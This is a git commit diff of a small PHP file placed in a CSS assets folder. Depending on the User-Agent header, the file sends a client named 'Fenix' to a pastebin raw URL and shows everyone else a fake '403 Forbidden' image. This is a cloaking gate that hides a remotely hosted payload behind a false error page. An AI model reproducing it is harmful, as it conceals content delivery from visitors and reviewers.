1bd44b7805e8cc75944024737bc7fdc7d45f922b
HappyTest1999 <61419655+HappyTest1999@users.noreply.github.com>
2020-02-24 21:28:23 +0100

    Update Test256.php

--- assets/css/Test256.php
+++ assets/css/Test256.php
@@ -1,7 +1,7 @@
 <?php 
 if(isset($_SERVER['HTTP_USER_AGENT']) && strlen(strstr($_SERVER['HTTP_USER_AGENT'],"Fenix")) > 0 ){
-header('Location: https://www.hostinger.es/tutoriales/wp-content/uploads/sites/7/2017/08/que-es-el-error-403-Prohibido-y-como-arreglarlo.jpg');
+header('Location: https://pastebin.com/raw/xt12XcSH');
 } else {
-header('Location: https://pastebin.com/raw/xt12XcSH'); exit();
+header('Location: https://www.hostinger.es/tutoriales/wp-content/uploads/sites/7/2017/08/que-es-el-error-403-Prohibido-y-como-arreglarlo.jpg'); exit();
 }
 ?>
